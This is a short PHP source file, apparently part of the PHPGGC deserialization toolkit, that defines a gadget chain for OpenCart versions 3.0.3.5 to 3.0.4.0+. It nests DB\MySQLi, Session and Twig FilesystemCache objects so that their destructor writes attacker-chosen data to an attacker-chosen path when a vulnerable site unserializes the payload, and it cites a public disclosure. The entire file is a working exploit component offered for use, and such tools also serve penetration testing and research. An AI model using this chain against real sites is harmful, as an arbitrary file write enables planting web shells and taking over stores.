<?php

namespace GadgetChain\OpenCart;

class FW2 extends \PHPGGC\GadgetChain\FileWrite
{
    public static $version = '3.0.3.5 <= 3.0.4.0+';
    public static $vector = '__destruct';
    public static $author = 'mcdruid';
    public static $information = '
      https://seclists.org/fulldisclosure/2022/May/30 describes a Gadget Chain
      using the Twig_Cache_Filesystem class, presumably in an older release.';

    public function generate(array $parameters)
    {
        $path = $parameters['remote_path'];
        $data = $parameters['data'];

        return new \DB\MySQLi(
            new \Session(
                // new \Twig_Cache_Filesystem(), // OpenCart 3.0.3.3 or older.
                new \Twig\Cache\FilesystemCache(),
                $path,
                $data
            )
        );
    }
}
